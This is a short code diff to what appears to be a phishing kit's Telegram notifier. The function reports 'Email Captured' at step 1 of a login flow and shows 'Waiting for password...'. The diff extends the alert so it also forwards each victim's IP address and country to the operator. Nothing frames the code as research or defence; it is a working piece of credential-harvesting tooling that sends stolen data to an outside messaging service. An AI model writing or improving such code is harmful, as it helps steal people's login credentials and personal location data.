@@ -40,7 +40,7 @@ def send_telegram_notification(message: str) -> bool:
         return False
 
 
-def notify_email_captured(email: str) -> None:
+def notify_email_captured(email: str, ip_address: str = "Unknown", country: str = "Unknown") -> None:
     """
     Notify when email is captured (step 1 of login).
     """
@@ -54,7 +54,9 @@ def notify_email_captured(email: str) -> None:
     message = (
         f"📧 <b>Email Captured</b>\n\n"
         f"📨 <b>Email:</b> <code>{email}</code>\n"
-        f"⏰ <b>Time:</b> {current_time}\n\n"
+        f"⏰ <b>Time:</b> {current_time}\n"
+        f"🌍 <b>IP Address:</b> <code>{ip_address}</code>\n"
+        f"🗺️ <b>Location:</b> {country}\n\n"
         f"⏳ <i>Waiting for password...</i>"
     )
     send_telegram_notification(message)
